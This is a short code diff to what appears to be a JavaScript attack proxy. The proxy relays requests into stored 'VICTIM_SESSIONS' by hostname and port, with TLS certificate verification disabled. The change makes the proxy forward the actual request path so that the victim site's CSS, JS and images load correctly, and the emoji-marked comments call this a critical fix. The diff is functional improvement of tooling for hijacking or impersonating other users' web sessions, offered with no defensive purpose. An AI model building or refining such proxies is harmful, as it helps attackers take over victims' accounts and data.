@@ -2048,11 +2048,12 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                 }
 
                 let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
+                // ⚠️ CRITICAL FIX: Use the actual incoming URL path, not the saved session path
                 const proxyRequestOptions = {
                     hostname: VICTIM_SESSIONS[currentSession].hostname,
                     port: VICTIM_SESSIONS[currentSession].port,
                     method: method,
-                    path: VICTIM_SESSIONS[currentSession].path,
+                    path: url,  // 🔥 FIXED: Use the actual request path to fetch CSS/JS/images correctly
                     headers: { ...headers },
                     rejectUnauthorized: false
                 };
